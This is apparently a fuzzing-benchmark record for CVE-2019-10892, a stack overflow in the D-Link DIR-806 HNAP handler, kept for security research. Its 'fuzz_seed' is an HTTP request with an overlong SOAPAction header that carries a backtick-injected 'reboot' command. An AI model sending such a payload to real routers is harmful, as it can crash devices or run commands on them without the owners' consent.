vulnerability_id: CVE-2019-10892
affected_vendor: D-Link
firmware_version: DIR-806_A1
firmware_architecture: MIPS-I
file_system: Squashfs
vulnerability_type: Stack Overflow
vulnerability_score: 9.8
vulnerability_severity: Critical
CWE_type: CWE-787
communication_protocol: HNAP
simulation_method: fat
vulnerability_description: An issue was discovered in D-Link DIR-806 devices. There is a stack-based buffer overflow in function hnap_main at /htdocs/cgibin. The function will call sprintf without checking the length of strings in parameters given by HTTP header and can be controlled by users. And it finally leads to a stack-based buffer overflow via a special HTTP header.
firmware_link: 
fuzz_seed: |
  POST /HNAP1/ HTTP/1.1
  Host: 127.0.0.1:49159
  Connection: keep-alive
  Accept-Encoding: gzip, deflate
  Accept: */*
  User-Agent: python-requests/2.27.1
  SOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`reboot`aaaaaaaaaaaaaaaaaaaaaa
  Content-Type: text/xml
  Cookie: uid=UUzkPysdIW
  Content-Length: 3

  ttt
